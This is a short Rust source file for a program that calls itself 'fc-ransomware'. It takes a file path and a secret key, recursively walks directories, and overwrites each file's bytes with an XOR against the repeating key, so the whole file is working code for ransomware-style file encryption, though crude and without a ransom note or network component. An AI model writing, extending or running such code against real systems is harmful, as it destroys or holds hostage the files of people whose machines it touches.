use clap::{App, Arg, ArgMatches};
use std::{fs, result, io, path};

pub fn get_args<'a>() -> ArgMatches<'a> {
    App::new("fc-ransomware")
        .version("1.0.0")
        .arg(Arg::with_name("file")
            .short("f")
            .long("file")
            .takes_value(true)
            .required(true)
            .index(1)
            .help("File to encrypt or decrypt"))
        .arg(Arg::with_name("key")
            .short("k")
            .long("key")
            .takes_value(true)
            .required(true)
            .help("The secret key used to encrypt or decrypt a file"))
        .get_matches()
}

pub fn walk_directory(file_path: &path::PathBuf, func: &dyn Fn(path::PathBuf) -> result::Result<(), io::Error>) -> result::Result<(), io::Error> {
    for entry in fs::read_dir(file_path)? {
        let entry = entry?;
        let path = entry.path();
        let metadata = fs::metadata(&path)?;

        if metadata.is_file() {
          let _ = func(path);
        } else if metadata.is_dir() {
          let _ = walk_directory(&path, &func);
        }
    }

    Ok(())
}

pub fn run_operation(path_to_file: &path::PathBuf, key: &str) -> result::Result<(), io::Error> {
    let contents: Vec<u8> = fs::read(&path_to_file).expect("Error reading file");
    let output: Vec<u8> = contents.iter()
        .enumerate()
        .map(|(i, val)| val ^ key.chars().nth(i % key.len()).unwrap() as u8)
        .collect();
    fs::write(path_to_file, output)
}
